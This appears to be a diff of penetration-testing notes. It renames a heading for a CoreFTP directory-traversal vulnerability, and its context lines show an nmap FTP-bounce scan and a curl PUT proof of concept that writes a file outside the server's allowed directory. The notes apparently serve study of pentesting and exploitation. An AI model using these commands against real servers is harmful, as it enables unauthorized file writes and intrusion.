@@ -21,7 +21,7 @@ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2 # 80 open
 
 ```bash
 #  CoreFTP Exploitation 
-## CoreFTP before build 727 (CVE-2022-22836)
+## CoreFTP Server build 725 - Directory Traversal (Authenticated)
 # This vulnerability allows us to write files outside the directory to which the service has access.
 # he CoreFTP service allows an HTTP `PUT` request, which we can use to write content to files
 curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
